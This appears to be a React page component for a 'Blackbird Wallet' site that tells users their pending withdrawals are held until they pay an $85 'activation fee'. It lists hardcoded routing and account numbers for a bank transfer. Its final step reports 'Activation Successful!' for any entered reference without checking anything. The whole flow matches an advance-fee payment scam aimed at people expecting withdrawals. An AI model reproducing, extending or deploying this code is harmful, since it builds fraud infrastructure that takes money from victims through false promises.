import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { Zap, Copy, Check } from 'lucide-react'
import Header from '../components/Header'
import Footer from '../components/Footer'

// 3-step stepper
function Stepper({ current }) {
  return (
    <div className="stepper">
      {[1, 2, 3].map((step, i) => (
        <div key={step} style={{ display: 'flex', alignItems: 'center', flex: i < 2 ? '1' : 'none' }}>
          <div className={`step-node ${current === step ? 'active' : 'inactive'}`}>
            {step}
          </div>
          {i < 2 && <div className="step-line" />}
        </div>
      ))}
    </div>
  )
}

export default function ActivatePage() {
  const navigate = useNavigate()
  const [step, setStep] = useState(1)
  const [paymentRef, setPaymentRef] = useState('')
  const [refError, setRefError] = useState('')
  const [copiedField, setCopiedField] = useState(null)

  const accountDetails = {
    routingNumber: '031101279',
    accountNumber: '450939861464118',
    bankName: 'The Bancorp Bank, N.A.'
  }

  const handleCopy = (text, fieldName) => {
    navigator.clipboard.writeText(text)
    setCopiedField(fieldName)
    setTimeout(() => setCopiedField(null), 2000)
  }

  // Step 1 — Activation Info
  const StepOne = () => (
    <div className="activate-card">
      <div className="activate-card-header">
        <div className="activate-icon-wrap">
          <Zap size={22} color="var(--accent-purple)" />
        </div>
        <div>
          <div className="activate-card-title">Activate Your Wallet</div>
          <div className="activate-card-sub">One-time activation required</div>
        </div>
      </div>

      <div className="activate-warning">
        To release your pending withdrawals and other pending transactions, your Blackbird Wallet needs to be activated.
      </div>

      <div className="activate-row">
        <span className="activate-row-label">Activation Fee</span>
        <span className="activate-row-value gold">$85</span>
      </div>
      <div className="activate-row">
        <span className="activate-row-label">Fee Type</span>
        <span className="activate-row-value">One-time only</span>
      </div>
      <div className="activate-row">
        <span className="activate-row-label">Processing Time</span>
        <span className="activate-row-value green">Instant activation</span>
      </div>

      <p className="activate-note">
        After activation, your account will process all withdrawals within 30 minutes.
        This is a one-time fee — no future charges.
      </p>
    </div>
  )

  // Step 2 — Payment
  const StepTwo = () => (
    <div className="activate-card">
      <div className="activate-card-header">
        <div className="activate-icon-wrap" style={{ background: 'linear-gradient(135deg, #1a3a6e, #2a5da0)' }}>
          <Zap size={22} color="var(--accent-blue)" />
        </div>
        <div>
          <div className="activate-card-title">Account details</div>
          <div className="activate-card-sub">Transfer to the account details below</div>
        </div>
      </div>

      <div className="account-details-container">
        <div className="account-detail-item">
          <div>
            <div className="account-detail-value">{accountDetails.routingNumber}</div>
            <div className="account-detail-label">Routing number</div>
          </div>
          <button
            type="button"
            className="copy-btn"
            onClick={() => handleCopy(accountDetails.routingNumber, 'routing')}
            title="Copy Routing Number"
          >
            {copiedField === 'routing' ? <Check size={18} color="var(--accent-green)" /> : <Copy size={18} />}
          </button>
        </div>

        <div className="account-detail-item">
          <div>
            <div className="account-detail-value gold" style={{ letterSpacing: '1px' }}>{accountDetails.accountNumber}</div>
            <div className="account-detail-label">Account number</div>
          </div>
          <button
            type="button"
            className="copy-btn"
            onClick={() => handleCopy(accountDetails.accountNumber, 'account')}
            title="Copy Account Number"
          >
            {copiedField === 'account' ? <Check size={18} color="var(--accent-green)" /> : <Copy size={18} />}
          </button>
        </div>

        <div className="account-detail-item">
          <div>
            <div className="account-detail-value">{accountDetails.bankName}</div>
            <div className="account-detail-label">Bank name</div>
          </div>
          <button
            type="button"
            className="copy-btn"
            onClick={() => handleCopy(accountDetails.bankName, 'bank')}
            title="Copy Bank Name"
          >
            {copiedField === 'bank' ? <Check size={18} color="var(--accent-green)" /> : <Copy size={18} />}
          </button>
        </div>
      </div>

      <p className="activate-note" style={{ marginTop: '16px' }}>
        After payment, enter your transfer reference below and click Confirm.
      </p>

      <div style={{ marginTop: '16px' }}>
        <label className="form-label">Payment Reference / Narration</label>
        <input
          type="text"
          className="form-input"
          placeholder="e.g. REF123456789"
          value={paymentRef}
          onChange={e => { setPaymentRef(e.target.value); setRefError('') }}
          style={{ marginTop: '8px' }}
        />
        {refError && <span style={{ color: '#ef4444', fontSize: '11px' }}>{refError}</span>}
      </div>
    </div>
  )

  // Step 3 — Success
  const StepThree = () => (
    <div className="activate-card" style={{ textAlign: 'center', padding: '40px 24px' }}>
      <div style={{
        width: 72, height: 72, borderRadius: '50%',
        background: 'rgba(34, 197, 94, 0.15)',
        border: '2px solid var(--accent-green)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        margin: '0 auto 20px'
      }}>
        <span style={{ fontSize: '32px' }}>✓</span>
      </div>
      <h2 style={{ fontSize: '20px', fontWeight: 700, marginBottom: '8px', color: 'var(--accent-green)' }}>
        Activation Successful!
      </h2>
      <p style={{ color: 'var(--text-secondary)', fontSize: '14px', marginBottom: '24px' }}>
        Your Blackbird Wallet has been activated. All pending withdrawals will be processed within 30 minutes.
      </p>
      <button className="btn-gold" onClick={() => navigate('/dashboard')}>
        Return to Dashboard
      </button>
    </div>
  )

  const handleContinue = () => {
    if (step === 1) { setStep(2); return }
    if (step === 2) {
      if (!paymentRef.trim()) { setRefError('Please enter your payment reference.'); return }
      setStep(3)
    }
  }

  return (
    <div className="page-wrapper">
      <Header />
      <main className="content-area">
        <div className="content-col">
          <Stepper current={step} />

          {step === 1 && <StepOne />}
          {step === 2 && <StepTwo />}
          {step === 3 && <StepThree />}

          {step < 3 && (
            <button className="btn-gold" onClick={handleContinue}>
              <Zap size={16} />
              {step === 1 ? 'Continue to Activate' : 'Confirm Payment'}
            </button>
          )}
        </div>
      </main>
      <Footer />
    </div>
  )
}
